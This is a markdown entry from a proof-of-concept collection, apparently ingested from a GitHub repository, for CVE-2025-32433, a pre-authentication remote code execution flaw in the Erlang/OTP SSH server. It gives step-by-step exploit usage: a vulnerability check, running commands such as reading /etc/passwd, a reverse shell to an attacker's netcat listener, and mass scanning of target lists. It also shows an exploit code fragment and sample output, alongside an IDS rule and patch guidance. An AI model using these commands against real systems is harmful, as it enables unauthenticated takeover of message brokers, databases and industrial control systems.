@@ -1,0 +1,189 @@
+
+<!-- 
+  File: 2026-05-17_erlang-otp-ssh-preauth-rce.md
+  Location: pocs/network/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-17 |
+| **Last Updated** | 2025-08-04 |
+| **Author / Researcher** | omer-efe-curkus |
+| **CVE / Advisory** | CVE-2025-32433 |
+| **Category** | network |
+| **Severity** | Critical |
+| **CVSS Score** | 10.0 (CVSSv3) |
+| **Status** | Patched |
+| **Tags** | RCE, pre-auth, unauthenticated, SSH, Erlang, OTP, RabbitMQ, CouchDB, ICS, OT, reverse-shell, in-the-wild |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Erlang/OTP SSH server daemon |
+| **Versions Affected** | OTP-27.3.2 and earlier; OTP-26.2.5.10 and earlier; OTP-25.3.2.19 and earlier |
+| **Language / Platform** | Erlang, Python (exploit), Linux/any OS running Erlang OTP |
+| **Authentication Required** | No (pre-authentication) |
+| **Network Access Required** | Yes (TCP port 22 or custom SSH port) |
+
+---
+
+## Summary
+
+CVE-2025-32433 is a critical pre-authentication remote code execution vulnerability in the Erlang/OTP SSH server with a CVSS score of 10.0. An attacker with network access to any service built on Erlang/OTP's SSH daemon can execute arbitrary OS commands without providing valid credentials by sending specially crafted SSH protocol messages before the authentication phase completes. Any application using Erlang's built-in SSH library is affected, including RabbitMQ, CouchDB, and OT/ICS control systems built on Erlang. The vulnerability was exploited in the wild against OT/ICS networks.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+The vulnerability resides in the SSH protocol message handling logic in Erlang/OTP's `ssh` application. The SSH daemon improperly processes certain SSH message types (specifically `SSH_MSG_CHANNEL_OPEN` and `SSH_MSG_CHANNEL_REQUEST` with an `exec` request type) before the authentication handshake is completed. By bypassing the authentication state machine, an attacker can send a channel open request followed by an exec channel request carrying an Erlang term or OS command string — and the server executes it in the Erlang runtime context with the permissions of the SSH server process.
+
+### Attack Vector
+
+1. Attacker establishes a raw TCP connection to target's SSH port.
+2. Attacker sends an SSH version banner (`SSH-2.0-OpenSSH\r\n`) to initiate the protocol exchange.
+3. Attacker sends a crafted `SSH_MSG_KEXINIT` packet to begin key exchange (never completed).
+4. **Before authentication**, attacker sends `SSH_MSG_CHANNEL_OPEN` (type `session`) — normally only valid post-auth.
+5. Attacker sends `SSH_MSG_CHANNEL_REQUEST` with request type `exec` and a payload containing an Erlang `os:cmd(...)` call.
+6. The Erlang SSH server executes the command without verifying the connection is authenticated.
+
+```python
+build_channel_open()    # SSH_MSG_CHANNEL_OPEN (0x5a)
+build_channel_request() # SSH_MSG_CHANNEL_REQUEST with exec + Erlang os:cmd("...")
+```
+
+### Impact
+
+Full unauthenticated remote code execution as the OS user running the Erlang/OTP SSH daemon. Common impact scenarios:
+- **RabbitMQ**: RCE as the rabbitmq service user; message broker compromise, lateral movement
+- **CouchDB**: RCE as couchdb user; database compromise, data exfiltration
+- **OT/ICS**: Compromise of industrial control systems and SCADA infrastructure running Erlang
+- **Reverse shell**: Single command delivers attacker interactive shell via bash TCP redirect
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Linux (Erlang/OTP SSH server target)
+Target:      Erlang/OTP SSH daemon - OTP-27.3.2 or earlier (any service built on it)
+Attacker:    Any host with Python 3 and network access to target port 22
+Tools:       Python 3 (stdlib only - no dependencies), netcat (for reverse shell listener)
+License:     Apache License 2.0
+```
+
+### Setup Steps
+
+```bash
+python cve-2025-32433.py 192.168.1.100 --check
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Check vulnerability** — Probe whether target responds to pre-auth channel messages.
+   ```bash
+   python cve-2025-32433.py 192.168.1.100 --check
+   ```
+
+2. **Execute a command** — Run arbitrary OS command on the target without credentials.
+   ```bash
+   python cve-2025-32433.py 192.168.1.100 -c 'id'
+   python cve-2025-32433.py 192.168.1.100 -c 'cat /etc/passwd'
+   ```
+
+3. **Reverse shell** — Get an interactive shell via bash TCP redirect.
+   ```bash
+   # Attacker: start listener
+   nc -lvnp 4444
+
+   # Fire reverse shell
+   python cve-2025-32433.py 192.168.1.100 --shell --lhost 192.168.1.50 --lport 4444
+   ```
+
+4. **Mass scanning** — Scan multiple hosts from a file.
+   ```bash
+   python cve-2025-32433.py -u targets.txt --check -o results.txt
+   ```
+
+### Exploit Code
+
+> See `cve-2025-32433.py` in this folder.
+
+```python
+command = f'os:cmd("bash -c \'id\'").'
+s.sendall(pad_packet(build_channel_open()))
+s.sendall(pad_packet(build_channel_request(command=command)))
+```
+
+### Expected Output
+
+```
+[*] Target: 192.168.1.100:22
+[*] Connecting to target...
+[+] Received banner: SSH-2.0-OTP-27.3.1
+[+] Server responded to unauthenticated channel message.
+[!!] 192.168.1.100:22 appears VULNERABLE to CVE-2025-32433
+```
+
+---
+
+## Screenshots / Evidence
+
+<!-- No screenshots captured at ingest time -->
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+```
+
+**SIEM / IDS Rule (example):**
+```
+alert tcp any any -> any 22 (msg:"Possible CVE-2025-32433 pre-auth SSH exec attempt";
+  content:"SSH-2.0-"; depth:8;
+  pcre:"/\x5a.{0,64}session/"; # SSH_MSG_CHANNEL_OPEN with "session"
+  sid:9000201;)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Upgrade to OTP-27.3.3+, OTP-26.2.5.11+, or OTP-25.3.2.20+ |
+| **Workaround** | Restrict SSH port access via firewall rules to trusted IPs only; disable Erlang SSH daemon if not required |
+| **Config Hardening** | For RabbitMQ/CouchDB: ensure management interfaces are not exposed to untrusted networks; review Erlang SSH usage |
+
+---
+
+## References
+
+- [CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433)
+- [Source Repository](https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC)
+- [GitHub Security Advisory GHSA-37cp-fgq5-7wc2](https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2)
+- [NVD CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433)
+- [Platform Security Blog Post](https://platformsecurity.com/blog/CVE-2025-32433-poc)
+
+---
+
+## Notes
+
+The exploit is implemented entirely in Python standard library (no external dependencies). It does not complete the SSH key exchange — it only sends a minimal `SSH_MSG_KEXINIT` before jumping directly to `SSH_MSG_CHANNEL_OPEN`. This means the exploit works even without cryptographic capabilities. Supports bulk scanning via `-u` flag and result file output via `-o` flag. Reverse shell uses bash's `/dev/tcp` facility. Repository is licensed under Apache License 2.0. Particularly dangerous for enterprise environments running RabbitMQ, CouchDB, or any embedded Erlang SSH service exposed to untrusted networks. Exploitation in the wild confirmed against OT/ICS networks.
+
+Auto-ingested from https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC on 2026-05-17.
+
